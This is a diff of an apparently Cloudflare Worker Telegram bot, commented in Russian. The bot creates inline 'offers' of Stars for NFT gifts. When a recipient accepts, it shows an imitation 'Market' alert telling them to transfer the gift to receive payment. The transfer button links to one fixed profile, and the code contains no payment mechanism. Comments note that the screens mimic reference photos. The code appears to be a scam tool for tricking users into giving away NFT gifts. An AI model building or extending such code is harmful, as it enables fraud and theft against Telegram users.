@@ -72,7 +72,7 @@ export default {
         }
       }
 
-      // --- INLINE ---
+      // --- INLINE (Создание офера) ---
       if (update.inline_query) {
         const iq = update.inline_query;
         const userId = iq.from.id;
@@ -82,104 +82,87 @@ export default {
 
         if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
-        const parts = iq.query.split(" ");
-        if (parts.length >= 3) {
-          const giftLink = parts[0];
-          const amount = parts[1];
-          const currency = parts[2];
+        // Умный парсинг: ищем любые цифры (сумма) и любую ссылку/название подарка
+        const textQuery = iq.query.trim();
+        const numMatch = textQuery.match(/\d+/); // Ищем сумму
+        const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); // Ищем подарок
 
-          let senderName = iq.from.first_name || "";
-          if (iq.from.last_name) senderName += " " + iq.from.last_name;
-          if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
-          
-          // Сохраняем юзернейм для кнопки "Передать"
-          const senderUsername = iq.from.username || ""; 
+        // Если ввели хоть что-то (даже с ошибками), бот сформирует оффер
+        const amount = numMatch ? numMatch[0] : "0";
+        const giftId = giftMatch ? giftMatch[0] : "Подарок";
 
-          const offerId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
-          if (kv) {
-            await kv.put(`offer:${offerId}`, JSON.stringify({ giftLink, amount, senderName, senderUsername }), { expirationTtl: 86400 });
+        let senderName = iq.from.first_name || "";
+        if (iq.from.last_name) senderName += " " + iq.from.last_name;
+        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
+
+        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за подарок <b>${giftId}</b>.\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+
+        const results = [{
+          type: "article",
+          id: "1",
+          title: `Оффер от ${senderName}`,
+          description: `За ${amount} ⭐ Stars`,
+          input_message_content: { message_text: text, parse_mode: "HTML" },
+          reply_markup: {
+            inline_keyboard: [
+              // В кнопке ВСЕГО 3 БУКВЫ. Это 100% влезает в лимит Telegram.
+              [{ text: "✅ Принять", callback_data: "acc" }],
+              [{ text: "❌ Отклонить", callback_data: "dec" }]
+            ]
           }
+        }];
 
-          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
-
-          const results = [{
-            type: "article",
-            id: "1",
-            title: `Оффер от ${senderName}`,
-            description: `За ${amount} ${currency}`,
-            input_message_content: { message_text: text, parse_mode: "HTML" },
-            reply_markup: {
-              inline_keyboard: [
-                [{ text: "✅ Принять", callback_data: `acc_${offerId}` }],
-                [{ text: "❌ Отклонить", callback_data: `dec_${offerId}` }]
-              ]
-            }
-          }];
-
-          await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
-        }
+        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
       }
 
       // --- КНОПКИ ---
       if (update.callback_query) {
         const cq = update.callback_query;
-        const data = cq.data;
         const chatId = cq.message.chat.id;
         const messageId = cq.message.message_id;
+        
+        // Получаем текст сообщения (или подпись под картинкой)
+        const messageText = cq.message.text || cq.message.caption || "";
         const hasCaption = !!cq.message.caption;
 
-        try {
-          if (data.startsWith("acc_")) {
-            const offerId = data.replace("acc_", "");
-            let offer = { amount: "⭐", senderName: "покупателя", senderUsername: "" };
-            
-            if (kv) {
-              const saved = await kv.get(`offer:${offerId}`);
-              if (saved) offer = JSON.parse(saved);
-            }
+        // Вытаскиваем сумму из текста сообщения (ищем цифры перед словом Stars)
+        const amountMatch = messageText.match(/(\d+)\s*⭐/);
+        const amount = amountMatch ? amountMatch[1] : "0";
 
-            // Останавливаем загрузку и показываем Alert
-            await callApi("answerCallbackQuery", { 
-              callback_query_id: cq.id, 
-              text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐`, 
-              show_alert: true 
-            });
-
-            // Безопасная ссылка на покупателя
-            let btnUrl = "https://t.me/";
-            if (offer.senderUsername) {
-               btnUrl += offer.senderUsername;
-            }
-
-            const newMarkup = { inline_keyboard: [[{ text: "Передать NFT ↗", url: btnUrl }]] };
-            const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐.`;
-
-            if (hasCaption) {
-              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
-            } else {
-              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
-            }
-          } 
-          else if (data.startsWith("dec_")) {
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-
-            const newText = `× Оффер отклонён.`;
-            const emptyMarkup = { inline_keyboard: [] };
-
-            if (hasCaption) {
-              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
-            } else {
-              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
-            }
-          }
-        } catch (err) {
-          // Если внутри кнопки произошла ошибка, мы выводим ее прямо в Telegram, чтобы ты видел причину!
-          console.error("Ошибка кнопки:", err.message);
+        if (cq.data === "acc") {
+          // 1. Мгновенно убираем загрузку и показываем всплывающее окно (как на фото 2)
           await callApi("answerCallbackQuery", { 
             callback_query_id: cq.id, 
-            text: "Ошибка: " + err.message, 
+            text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐`, 
             show_alert: true 
-          }).catch(e => console.error(e));
+          });
+
+          // 2. Меняем текст сообщения (как на фото 2)
+          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
+          // Кнопка просто ведет в твой профиль для передачи (так как мы не передаем юзернейм)
+          const newMarkup = { 
+            inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] 
+          };
+
+          if (hasCaption) {
+            await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
+          } else {
+            await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
+          }
+        } 
+        else if (cq.data === "dec") {
+          // 1. Убираем загрузку
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+
+          // 2. Меняем текст (как на фото 5)
+          const newText = `× Оффер отклонён.`;
+          const emptyMarkup = { inline_keyboard: [] };
+
+          if (hasCaption) {
+            await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
+          } else {
+            await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
+          }
         }
       }
 
@@ -191,22 +174,12 @@ export default {
   }
 };
 
-// Функция теперь логирует ошибки Telegram в консоль Cloudflare
 async function callApi(method, body) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-  try {
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body)
-    });
-    const data = await response.json();
-    if (!data.ok) {
-      console.error(`Telegram API Error [${method}]:`, JSON.stringify(data));
-    }
-    return data;
-  } catch (e) {
-    console.error(`Fetch Error [${method}]:`, e.message);
-    throw e;
-  }
+  const response = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body)
+  });
+  return response.json();
 }
